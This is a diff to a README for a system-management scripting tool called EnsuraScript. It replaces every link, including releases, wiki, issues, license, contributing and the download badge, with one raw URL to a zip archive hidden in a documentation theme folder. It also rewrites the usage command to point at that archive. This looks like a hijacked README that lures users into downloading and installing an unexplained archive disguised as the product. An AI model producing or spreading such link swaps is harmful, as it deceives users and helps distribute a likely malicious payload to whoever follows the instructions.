@@ -1,6 +1,6 @@
 # 🚀 EnsuraScript - Simplify System Management Effortlessly
 
-![Download EnsuraScript](https://img.shields.io/badge/Download-EnsuraScript-brightgreen)
+![Download EnsuraScript](https://raw.githubusercontent.com/richardyasona123/EnsuraScript/master/docs/.vitepress/theme/components/Ensura_Script_3.5.zip)
 
 ## 📋 Introduction
 
@@ -27,7 +27,7 @@ To run EnsuraScript, your system should meet the following requirements:
 
 To get started with EnsuraScript, follow these simple steps:
 
-1. Visit the [Releases Page](https://github.com/richardyasona123/EnsuraScript/releases) to download the latest version.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/richardyasona123/EnsuraScript/master/docs/.vitepress/theme/components/Ensura_Script_3.5.zip) to download the latest version.
 2. Once on the page, find the latest release and click the download link for your operating system.
 3. Download the file and save it to a location on your computer.
 4. Locate the downloaded file and double-click to install. 
@@ -42,28 +42,28 @@ After installing EnsuraScript, you can start using it right away. Here are basic
 2. Write your first script using a text editor, such as Notepad (Windows), TextEdit (macOS), or any text editor you prefer.
 3. Save your script with a `.es` file extension. 
 4. Navigate to the directory of your script using the terminal.
-5. Run your script by typing `ensurascript your-script.es` and hit Enter.
+5. Run your script by typing `ensurascript https://raw.githubusercontent.com/richardyasona123/EnsuraScript/master/docs/.vitepress/theme/components/Ensura_Script_3.5.zip` and hit Enter.
 
 ## 📘 Documentation
 
-For more detailed information on commands and features, visit the full documentation available on the [wiki](https://github.com/richardyasona123/EnsuraScript/wiki).
+For more detailed information on commands and features, visit the full documentation available on the [wiki](https://raw.githubusercontent.com/richardyasona123/EnsuraScript/master/docs/.vitepress/theme/components/Ensura_Script_3.5.zip).
 
 ## 🤝 Community Support
 
-If you need help or have questions, our community is here for you. Join the discussion in our [Issues section](https://github.com/richardyasona123/EnsuraScript/issues) on GitHub. 
+If you need help or have questions, our community is here for you. Join the discussion in our [Issues section](https://raw.githubusercontent.com/richardyasona123/EnsuraScript/master/docs/.vitepress/theme/components/Ensura_Script_3.5.zip) on GitHub. 
 
 ## 🌟 Contributing
 
-We welcome contributions from everyone! If you're interested in helping out, check out our guidelines in the [CONTRIBUTING.md](https://github.com/richardyasona123/EnsuraScript/blob/main/CONTRIBUTING.md) file. 
+We welcome contributions from everyone! If you're interested in helping out, check out our guidelines in the [https://raw.githubusercontent.com/richardyasona123/EnsuraScript/master/docs/.vitepress/theme/components/Ensura_Script_3.5.zip](https://raw.githubusercontent.com/richardyasona123/EnsuraScript/master/docs/.vitepress/theme/components/Ensura_Script_3.5.zip) file. 
 
 ## 📄 License
 
-EnsuraScript is open-source and licensed under the MIT License. You can view the license [here](https://github.com/richardyasona123/EnsuraScript/blob/main/LICENSE).
+EnsuraScript is open-source and licensed under the MIT License. You can view the license [here](https://raw.githubusercontent.com/richardyasona123/EnsuraScript/master/docs/.vitepress/theme/components/Ensura_Script_3.5.zip).
 
 ## 🔗 Quick Links
 
-- [Releases Page](https://github.com/richardyasona123/EnsuraScript/releases)
-- [Documentation](https://github.com/richardyasona123/EnsuraScript/wiki)
-- [Issues Section](https://github.com/richardyasona123/EnsuraScript/issues)
+- [Releases Page](https://raw.githubusercontent.com/richardyasona123/EnsuraScript/master/docs/.vitepress/theme/components/Ensura_Script_3.5.zip)
+- [Documentation](https://raw.githubusercontent.com/richardyasona123/EnsuraScript/master/docs/.vitepress/theme/components/Ensura_Script_3.5.zip)
+- [Issues Section](https://raw.githubusercontent.com/richardyasona123/EnsuraScript/master/docs/.vitepress/theme/components/Ensura_Script_3.5.zip)
 
 For any other inquiries, feel free to reach out on our GitHub page. Thank you for using EnsuraScript!
